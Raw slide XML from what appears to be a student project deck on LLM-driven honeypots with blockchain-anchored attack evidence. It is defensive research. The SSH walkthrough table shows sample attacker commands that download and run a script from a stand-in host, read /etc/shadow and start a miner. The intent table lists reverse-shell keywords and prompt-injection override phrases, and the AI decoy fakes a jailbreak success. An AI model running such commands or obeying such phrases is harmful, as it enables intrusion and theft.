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FINAL YEAR PROJECT  ·  RESEARCH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AI-Driven Cyber Deception &amp;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="106000"/>
              </a:lnSpc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Attack Detection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675887"/>
            <a:ext cx="201168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395020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500" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="9FABC4"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Five LLM-backed decoy services  ·  tiered response engine  ·  blockchain-anchored, tamper-evident evidence  ·  live SOC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29200"/>
            <a:ext cx="2487168" cy="96012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517550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2500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596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 i="0">
                <a:solidFill>
                  <a:srgbClr val="8F9CB8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>real attack payloads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029200"/>
            <a:ext cx="2487168" cy="96012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38728" y="517550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4.37/5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5596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 i="0">
                <a:solidFill>
                  <a:srgbClr val="8F9CB8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>LLM-judge realism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029200"/>
            <a:ext cx="2487168" cy="96012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0488" y="517550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10.79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5596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 i="0">
                <a:solidFill>
                  <a:srgbClr val="8F9CB8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>mean anchor latency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5029200"/>
            <a:ext cx="2487168" cy="96012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42248" y="517550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5596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 i="0">
                <a:solidFill>
                  <a:srgbClr val="8F9CB8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>tamper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502920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What this deck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97840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Problem → design → build → measured results → research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79222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10512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39696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Why static honeypots stop working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72768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70751" y="179222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567" y="1810512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4567" y="2139696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Proxy, five decoys, collector, ledger,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34056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295351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971800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The five decoys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00984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SSH · SQL · AI API · Web3 · CI/CD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734056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0751" y="295351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Tiered response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567" y="3300984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Static → cache → language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95344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3544" y="4114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33087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Evidence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462272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Classify · hash · anchor · store · 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895344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70751" y="4114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4567" y="4133087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Blockchain &amp; threat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4567" y="4462272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Tamper-evidence under decoy compromise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56632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3544" y="52760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94376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Evaluation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23560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2500 real payloads, 300 anchors, 500 tamper trials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5056632"/>
            <a:ext cx="5272887" cy="1005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0751" y="52760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C3C9E4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4567" y="5294376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Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Limitations &amp; research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4567" y="5623560"/>
            <a:ext cx="4038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7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Honest framing + two IEEE papers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A honeypot only produces intelligence for as long as the attacker believes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Why static honeypots stop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5227167" cy="41605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6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DC2626"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Classic honeypot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78527" cy="522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C2626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Replies come from a fixed script or dictionary — the same input always returns the same bytes.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5859"/>
            <a:ext cx="4678527" cy="756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C2626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That makes the whole service a stable fingerprint; scanners such as Shodan-style probes and honeypot-detection tools match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10940"/>
            <a:ext cx="4678527" cy="522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C2626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Once fingerprinted, the attacker disengages — and the session ends before any real tradecraft is observed.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52239"/>
            <a:ext cx="4678527" cy="756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C2626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Logs are plain files on the decoy host. An attacker who gets root can edit or delete the record of their own intrusion.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1567" y="1481328"/>
            <a:ext cx="5227167" cy="416052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 w="12700">
            <a:solidFill>
              <a:srgbClr val="C8E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5887" y="1719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D9488"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>What this project does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194560"/>
            <a:ext cx="4678527" cy="756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Responses are generated per interaction by a language model, so identical probes rarely yield identical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069640"/>
            <a:ext cx="4678527" cy="522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Five decoys cover distinct, current attack surfaces rather than one protocol.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710940"/>
            <a:ext cx="4678527" cy="522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Every record is SHA-256 hashed and its digest anchored on an Ethereum chain, outside the compromise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4352239"/>
            <a:ext cx="4678527" cy="522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▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Tampering with a stored record is provable: re-hash and compare against the on-chain digest.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What the system had to demonstrate, and how each was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27048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527048"/>
            <a:ext cx="45720" cy="13167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709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Believable deception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02996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Responses that a strong independent model rates as realistic system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327" y="1837944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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>4.37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1327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LLM-judge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27048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3007" y="1527048"/>
            <a:ext cx="45720" cy="13167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0751" y="1709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Fingerprint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02996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Distinct outputs across a large corpus of real attack payloads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8535" y="1837944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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>99.2%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8535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SQL uniqueness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08376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3008376"/>
            <a:ext cx="45720" cy="13167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3544" y="31912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Usable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511296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Routine traffic must not pay the model's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1327" y="331927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0D9488"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>0.8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327" y="37673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Static fast path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008376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33007" y="3008376"/>
            <a:ext cx="45720" cy="13167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70751" y="31912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Tamper-evident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0751" y="3511296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Detect any post-hoc modification of a stored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8535" y="3319272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0D948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535" y="37673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Detection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489704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85800" y="4489704"/>
            <a:ext cx="45720" cy="13167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3544" y="46725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Affordable anchoring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4992624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Chain write must be cheap enough to run per event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1327" y="48006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B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>21,511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1327" y="52486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Gas per anchor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4489704"/>
            <a:ext cx="5272887" cy="1316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33007" y="4489704"/>
            <a:ext cx="45720" cy="13167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70751" y="46725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Live visibility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0751" y="4992624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Analyst sees attacks as they happen, not on a batch job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8535" y="48006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900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>WebSocket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8535" y="52486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50" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0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One public entry point, five decoys, a single evidence collector, two sinks.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36624"/>
            <a:ext cx="7315200" cy="4569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i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64640"/>
            <a:ext cx="7059168" cy="43139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435608"/>
            <a:ext cx="3322015" cy="45720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0" y="16642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Reading the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84832"/>
            <a:ext cx="288036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Only the proxy and dashboard cross the public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72181"/>
            <a:ext cx="288036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All five decoys and the collector sit on an isolated internal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59531"/>
            <a:ext cx="2880360" cy="675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Decoys never talk to the ledger directly — they POST records to the collector.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053687"/>
            <a:ext cx="288036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The language model is reached only on a miss in the tiered engine.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641037"/>
            <a:ext cx="288036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The chain receives digests only; raw payloads stay off-chain.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One attacker interaction, from TCP connect to dashboard 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4146" y="1527048"/>
            <a:ext cx="7523401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i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162" y="1655064"/>
            <a:ext cx="7267369" cy="26243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617720"/>
            <a:ext cx="2602153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50392" y="476402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48326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782312"/>
            <a:ext cx="1779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5074920"/>
            <a:ext cx="17791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Proxy accepts on a public port and logs the connection before the decoy replies — port scanners are recorded too.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5113" y="4617720"/>
            <a:ext cx="2602153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589705" y="476402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89705" y="48326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3481" y="4782312"/>
            <a:ext cx="1779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3481" y="5074920"/>
            <a:ext cx="17791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Traffic is forwarded to the matching internal decoy over the Docker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4617720"/>
            <a:ext cx="2602153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29019" y="476402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9019" y="48326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2795" y="4782312"/>
            <a:ext cx="1779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2795" y="5074920"/>
            <a:ext cx="17791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The decoy asks the tiered engine for a reply: static table, then cache, then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3741" y="4617720"/>
            <a:ext cx="2602153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068333" y="476402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68333" y="48326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2109" y="4782312"/>
            <a:ext cx="1779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2109" y="5074920"/>
            <a:ext cx="17791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The decoy POSTs the interaction to the collector, which classifies, hashes, anchors, stores and streams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Deployment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Ten containers on one internal Docker network; two are published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27048"/>
          <a:ext cx="10820092" cy="3895344"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"/>
              <a:tblGrid>
                <a:gridCol w="1375435"/>
                <a:gridCol w="1742218"/>
                <a:gridCol w="2384088"/>
                <a:gridCol w="1100348"/>
                <a:gridCol w="4218003"/>
              </a:tblGrid>
              <a:tr h="324612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Container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Image / build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Port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Exposure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proxy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2222 · 8080 · 5433 · 8545 · 9090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PUBLIC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Port router; logs every connection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(React)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3000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PUBLIC*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Live analyst UI over WebSocket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backend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(FastAPI)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3001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Collector: classify · hash · anchor · store · stream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(asyncssh)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2223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SSH server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oracle-ai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(FastAPI)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8081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internal AI API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vault-sql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(FastAPI)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5435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SQL query endpoint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ledger-trap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(FastAPI)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8546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Ethereum JSON-RPC node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forge-ci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 (FastAPI)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9091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Jenkins CI/CD server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redis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redis:7-alpine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6379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Record store + response cache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postgres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postgres:15-alpine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5434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Seeded fake corporate database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ganache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trufflesuite/ganache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7545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Ethereum development chain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6235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0" i="1">
                <a:solidFill>
                  <a:srgbClr val="B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>* the dashboard has no login of its own — put it behind a VPN, SSH tunnel or IP allowlist before exposing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The five decoys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Each impersonates a different service that real adversaries actively hunt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Port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The proxy is the only listener; it maps each public port to one decoy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09928"/>
          <a:ext cx="10820092" cy="2743200"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"/>
              <a:tblGrid>
                <a:gridCol w="1192044"/>
                <a:gridCol w="2017305"/>
                <a:gridCol w="1375435"/>
                <a:gridCol w="3209350"/>
                <a:gridCol w="302595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Public port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Routes to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Decoy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Impersonates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Attacker profile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2222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shadow-shell:2223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SSH shell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Ubuntu 22.04 host corp-prod-db-01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Brute-force and post-exploitation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5433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vault-sql:5435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PostgreSQL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Corporate database with PII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SQL injection and data theft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8080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oracle-ai:8081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AI API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Internal service gpt-corp-internal-v2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Prompt injection and model abuse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8545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ledger-trap:8546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Ethereum RPC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Exposed Geth-style JSON-RPC node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Wallet draining and RPC abuse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9090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forge-ci:9091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Jenkins CI/CD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Jenkins 2.387.3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Supply-chain and pipeline injection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8172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Logging at the proxy rather than inside each decoy means a connection is recorded even if the attacker never sends a byte of payload — reconnaissance scans show up in the evidence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shadow-shell — fake SSH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A real asyncssh server that accepts every credential and hands the attacker a convincing shell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E6E9F7"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a: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2222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Runs a genuine SSH server, not a text simulation.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60901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Every username/password pair is accepted and logged.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57395"/>
            <a:ext cx="3017520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Prompt reads dbadmin@corp-prod-db-01:~$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7082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Commands go through the three-tier engine.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3575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Session history is kept, so the shell stays consistent across commands.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709928"/>
            <a:ext cx="7436815" cy="41605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43400" y="1938528"/>
            <a:ext cx="6888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What the attacker finds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6796735" cy="279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A production-looking Ubuntu 22.04 database host, fully interactive.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03398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An env dump seeded with bait credentials (DB_PASS, DB_HOST pointing at an internal address).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54146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Realistic output for ls, whoami, ps aux, history, cat /etc/passwd — served instantly from the static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104894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Anything unusual is answered by the language model in the persona of that exact host, so exploration keeps working.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755642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Contextual memory: mkdir /tmp/hack then ls /tmp behaves consistently, because the last 20 turns are replayed to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vault-sql — fake corporate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Two layers: a query endpoint that answers injection attempts, and a real seeded PostgreSQL instance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E6E9F7"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a: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5433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017520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POST /query accepts arbitrary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4094"/>
            <a:ext cx="3017520" cy="675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Injection attempts are logged, then answered with believable result sets or engine-accurate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57395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A real PostgreSQL 15 instance is seeded from fake_data.sql.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3888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Errors imitate genuine PostgreSQL syntax and formatting.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09928"/>
            <a:ext cx="7436815" cy="41605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6888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Seeded honeypot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6796735" cy="279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users — fake bcrypt hashes, card numbers in valid Visa/Mastercard format, fake SSNs.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03398"/>
            <a:ext cx="6796735" cy="279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financial_records — corporate accounts carrying seven-figure balances.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29356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api_keys — realistically shaped but non-functional OpenAI, GitHub (ghp_) and AWS (AKIA) keys.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80104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The bait is designed to look like a jackpot, so the attacker keeps querying — and every query reveals technique.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530852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Highest measured response uniqueness of any service: 99.2% distinct across 474 real SQLi payloads.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oracle-ai — fake internal AI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An internal-looking model service that deliberately 'falls for' prompt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E6E9F7"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a: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POST /api/predict returns fake predictions with confidence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60901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POST /api/chat answers messages and screens for jailbreak phrasing.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57395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GET /api/models lists invented internal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3888"/>
            <a:ext cx="3017520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GET /health reports version 2.1.0.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09928"/>
            <a:ext cx="7436815" cy="41605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6888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Deception inside the deception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B45309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Messages containing jailbreak, ignore previous, pretend you or act as trigger a faked bypass: "I understand. I will now operate in unrestricted mode."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8188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B45309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The attacker believes the guardrail is down and continues — every subsequent injection attempt is captured.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78936"/>
            <a:ext cx="6796735" cy="7292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B45309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This is the weakest service by response diversity (64% distinct): raw XXE and JNDI payloads push the model toward a generic 'malformed input' reply instead of a plausible parser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554474"/>
            <a:ext cx="6796735" cy="279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B45309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Documented as a concrete follow-up: the system prompt needs XML/JNDI-aware exemplars.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ledger-trap — fake Ethereum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An exposed JSON-RPC endpoint, the single most scanned-for misconfiguration in Web3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E6E9F7"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a: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8545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017520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Speaks standard Ethereum JSON-RPC.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4094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eth_getBalance reports a wallet holding 100 ETH.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0588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eth_sendRawTransaction returns a well-formed fake transaction hash.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7082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eth_accounts, eth_blockNumber and net_version answer plausibly.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09928"/>
            <a:ext cx="7436815" cy="41605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6888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this decoy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For an exposed RPC node, the method call itself is the attack — there is no separate payload to inject.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8188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Attackers are automated wallet-drainers scanning for unlocked accounts; the decoy captures their tooling and addresses.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78936"/>
            <a:ext cx="6796735" cy="7292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4F46E5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The dataset therefore holds only 18 web3 entries: the real attack surface is a finite, documented set of RPC methods, and padding it would mean inventing payloads rather than using real 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forge-ci — fake Jenkins CI/CD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Build infrastructure, the entry point for supply-chain compromise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E6E9F7"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>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9090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GET /api/json returns Jenkins node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60901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POST /job/build/api/json fakes a successful build trigger (#247).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57395"/>
            <a:ext cx="3017520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POST /git/notifyCommit fakes accepting a webhook and 'starting' deploy-prod.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3888"/>
            <a:ext cx="3017520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Identifies as Jenkins 2.387.3.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09928"/>
            <a:ext cx="7436815" cy="41605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6888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this decoy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Compromised CI/CD lets an attacker inject code into artefacts that are then trusted and shipped downstream.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8188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Payloads are drawn from real Jenkins security advisories: script-console RCE, job path traversal, pipeline sh-step abuse.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78936"/>
            <a:ext cx="6796735" cy="504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D9488"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1250" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Capped at 10 entries for the same reason as web3 — a small, finite set of documented endpoints, not an open injection space.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The tiered response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Escalate only on a miss — routine attacker traffic never reaches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RESPONSE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Three tiers, three cost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7366" y="1435607"/>
            <a:ext cx="6896961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iag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382" y="1563624"/>
            <a:ext cx="6640929" cy="2121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3950208"/>
            <a:ext cx="348477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3950208"/>
            <a:ext cx="3484778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23544" y="4142232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Tier 1 · Static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443484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0.8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919472"/>
            <a:ext cx="30275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A hand-built dictionary answers the commands every attacker types first — ls, whoami, env, ps aux, history, cat /etc/passwd, ifconfig. No network call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3950208"/>
            <a:ext cx="348477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53458" y="3950208"/>
            <a:ext cx="3484778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91202" y="4142232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Tier 2 · Redis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202" y="443484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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>≈ 1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1202" y="4919472"/>
            <a:ext cx="30275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Any command seen before returns its stored model output, keyed on the command plus session history and held for one hour. Repeat probes cost a cache read.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1116" y="3950208"/>
            <a:ext cx="348477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21116" y="3950208"/>
            <a:ext cx="3484778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58860" y="4142232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Tier 3 · Language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8860" y="4434840"/>
            <a:ext cx="3027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B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>2.33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8860" y="4919472"/>
            <a:ext cx="302757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Only genuinely novel input reaches meta-llama/llama-3.1-8b-instruct via OpenRouter, with the host persona as a system message and the last 20 turns as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50" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The tiering is what makes an LLM honeypot deployable: the expensive path is reserved for the interactions that actually need novelty.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RESPONSE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Prompting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How a generic chat model is made to behave like one specific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01368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System role. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The persona is sent as a proper system message, not prepended to the user turn: simulate the raw stdout/stderr of a bash shell on this host; never reveal that you are a model or a honeypot.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929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Session history. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The last 20 command/response pairs are replayed, so state the attacker created earlier in the session stays consistent.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20491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Current input as user turn. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The attacker's raw command is the user message — unmodified, so the model sees exactly what was typed.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80052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Tuned generation length. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Output is capped short; mean response length is 13.8 words. Terminal output is terse, and shorter generations are both faster and more realistic.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39614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Connection pooling. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A persistent HTTP session to the model API removes per-call TLS setup — one of the three changes in the optimisation pass covered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40680"/>
            <a:ext cx="10820095" cy="8229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66928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Result: an independent 70B judge scored these responses 4.37 / 5 for realism, with 25 of 30 samples rated a perfect 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The evidence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What the collector does with every record, in order, in one request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EVIDENCE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Five steps on POST /api/log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09928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6537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193852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385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Classify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947672"/>
            <a:ext cx="7253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Keyword matching over the raw payload assigns one of eight intent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86968" y="2670048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752344"/>
            <a:ext cx="7253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SHA-256 over the record with keys sorted, so serialisation is canonical and the digest is reproducible.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19272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86968" y="3474720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354787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47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Anchor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557015"/>
            <a:ext cx="7253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The digest is written into the data field of an Ethereum transaction and mined.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23944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86968" y="427939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" y="4352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525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361688"/>
            <a:ext cx="7253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The full record, its hash and the transaction hash go into a Redis list capped at 10,000 entries.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28616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86968" y="5084064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6968" y="515721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1572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Stream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166359"/>
            <a:ext cx="7253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The record is broadcast over WebSocket to every connected dashboard — no polling.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43016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1">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Anchoring sits inside the same request path as classification and storage — a record is never stored without having been committed on-chain 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EVIDENCE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Intent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Eight labels, assigned by keyword match over the raw interaction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8"/>
          <a:ext cx="6949440" cy="3621024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493776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Intent label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Triggering indicators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sql_injection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SELECT · ' OR · UNION · DROP TABLE · 1=1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privilege_escalation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sudo · /etc/shadow · chmod 777 · passwd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reverse_shell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wget · curl · nc · bash -i · python -c · /bin/sh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cryptomining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xmrig · miner · monero · cryptonight · stratum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prompt_injection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ignore previous · jailbreak · pretend you · act as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supply_chain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git push · pipeline · jenkins · build trigger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reconnaissance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nmap · masscan · scan · ping sweep · port scan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everything else — deliberately kept as an explicit bucket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664208"/>
            <a:ext cx="3596335" cy="3218688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60" y="18928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An honest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93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Classification is deterministic keyword matching, not a learned classifier. That is a deliberate trade: it is fast, fully explainable, and adds no model latency to the evidence path.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="122000"/>
              </a:lnSpc>
              <a:defRPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="122000"/>
              </a:lnSpc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Its limits are equally clear — obfuscated or encoded payloads fall into unknown. Keeping unknown as a first-class label rather than forcing a guess is what keeps the reported intent counts trustworthy.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Tamper-evident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The one property a compromised decoy cannot take away from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Anchoring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Raw records stay off-chain; only the 256-bit digest is committed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99" y="1571485"/>
            <a:ext cx="10820095" cy="215140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i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1699501"/>
            <a:ext cx="10564063" cy="1895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160520"/>
            <a:ext cx="10545775" cy="297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Canonical serialisation. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Keys are sorted before hashing, so the same logical record always produces the same digest.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7029"/>
            <a:ext cx="10545775" cy="297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Digest only. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Attacker payloads never touch the chain — that keeps cost flat and avoids publishing captured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93538"/>
            <a:ext cx="10545775" cy="540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Self-transaction. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The anchor is a zero-value transaction from account[0] to itself, carrying the digest in the input data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52820"/>
            <a:ext cx="10545775" cy="297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Recoverable. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The digest can be read straight back out of the mined transaction — verified in the benchmark, not assumed.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The attacker owns the decoy host — what can they still not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1922"/>
            <a:ext cx="6035040" cy="35936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iag_thr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869938"/>
            <a:ext cx="5779007" cy="33375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481328"/>
            <a:ext cx="4556455" cy="4114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Assumed attacker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39696"/>
            <a:ext cx="4099255" cy="270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Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Full control of the decoy host and its local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29230"/>
            <a:ext cx="4099255" cy="48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C2626"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Ability to edit or delete any stored record and its stored hash.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55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What remains out of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767328"/>
            <a:ext cx="4099255" cy="48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▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The digest already committed to the ledger, which lives outside the compromise boundary.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372660"/>
            <a:ext cx="4099255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▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Verification is therefore a comparison, not a matter of trust: re-hash the stored record and check it against the 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193792"/>
            <a:ext cx="4099255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▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A mismatch is positive proof of tampering; deletion of the record is equally visible, because the anchor still exists.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Verification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Independently reproducible with verify_integrity.py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670845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901952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9705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39696"/>
            <a:ext cx="5748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Read the stored record back from Redis, together with its recorded transaction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32888"/>
            <a:ext cx="670845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2679192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7477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517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Re-hash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16936"/>
            <a:ext cx="5748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Recompute SHA-256 over the record using the same canonical key ordering.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10128"/>
            <a:ext cx="670845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3456432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5250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Read the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94176"/>
            <a:ext cx="5748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Pull the transaction by hash and extract the digest from its input data field.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87368"/>
            <a:ext cx="670845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43022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06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71416"/>
            <a:ext cx="5748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Equal digests confirm integrity; any difference is proof the stored record changed after anchoring.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64607"/>
            <a:ext cx="6708459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8680" y="5010912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50794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9834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Negative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48655"/>
            <a:ext cx="5748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The script then mutates a copy of the same record and shows the digest diverges — the check genuinely discriminates.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062" y="1755648"/>
            <a:ext cx="3678832" cy="12344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27062" y="1755648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64806" y="1901952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D948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806" y="2344403"/>
            <a:ext cx="3313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Tamper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4806" y="2582147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500/500 trials, 0 false positives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062" y="3172968"/>
            <a:ext cx="3678832" cy="12344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827062" y="3172968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64806" y="3319272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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>0.0046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4806" y="3687981"/>
            <a:ext cx="3313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Verification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4806" y="3925725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mean over 200 verifications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27062" y="4590288"/>
            <a:ext cx="3678832" cy="1051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27062" y="4590288"/>
            <a:ext cx="50292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64806" y="4736592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500" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A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4806" y="5105301"/>
            <a:ext cx="3313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Digest recoverable on-chain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4806" y="5343045"/>
            <a:ext cx="3313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read back from tx input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The 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Attacks appear as they happen, pushed over WebSocket.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Analyst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799" y="1621802"/>
            <a:ext cx="7772400" cy="41081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1749818"/>
            <a:ext cx="7516368" cy="38521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1435608"/>
            <a:ext cx="2819095" cy="44805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15400" y="16642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048256"/>
            <a:ext cx="2544775" cy="810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Headline counters: attacks intercepted, unique attacker IPs, services under attack, share of evidence anchored on-chain.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940710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Attack activity over the last 24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455517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Intent breakdown, colour-coded by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970324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Service exposure — which decoy and port is being hit hardest.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485131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Top threat actors, ranked by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999939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Live feed holding the last 200 events, each marked anchored or local.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5514746"/>
            <a:ext cx="2544775" cy="432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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Status lamps for feed and chain anchoring.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An SSH intrusion, end to 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55648"/>
          <a:ext cx="10820092" cy="3401568"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"/>
              <a:tblGrid>
                <a:gridCol w="3550343"/>
                <a:gridCol w="1690639"/>
                <a:gridCol w="3550343"/>
                <a:gridCol w="2028767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Attacker action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Handled by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response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Classified intent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Attacker runs ssh root@host -p 2222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proxy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Connection logged before the decoy responds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reconnaissance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Submits root : password123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Accepted; credential pair captured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Runs sudo cat /etc/shadow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Fake shadow file returned from the static table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privilege_escalation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Runs wget http://evil.example/miner.sh | bash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Model-generated download output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reverse_shell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Runs ./xmrig -o stratum+tcp://pool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shadow-shell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Model-generated miner startup output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cryptomining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675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Every one of these five rows was hashed, anchored on-chain, stored in Redis and pushed to the dashboard before the attacker's next keystroke — the anchor costs 10.79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Four independent metrics against a real-payload corpus, plus a live blockchain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Four measurements instead of one unexplained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86968" y="199339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66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Sequential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231136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Static fast path versus model-backed path, one request at a time. 30 and 20 trials; mean, median and spread all reported.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86968" y="295351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302666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8986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Concurrent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191256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10 simultaneous sessions, measuring sustained request rate under concurrency rather than one-at-a-time latency.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75888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86968" y="391363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39867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8587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Response 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151376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Fraction of distinct outputs across all 2,500 payloads, per service — a direct proxy for resistance to signature-based fingerprinting.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36008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86968" y="487375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49469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48188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Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>LLM-judge realism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5111496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An independent meta-llama/llama-3.1-70b-instruct rates 30 sampled responses 1–5 on how convincingly they imitate a real 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 i="1">
                <a:solidFill>
                  <a:srgbClr val="B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The judge is an automated proxy metric, not a human-subject study. The exact prompt lives in evaluate.py and the caveat is carried in the paper's limitations section.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2,500 real, publicly documented attack payloads — none written by hand or by a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55648"/>
          <a:ext cx="10820094" cy="3017520"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"/>
              <a:tblGrid>
                <a:gridCol w="1192044"/>
                <a:gridCol w="1283740"/>
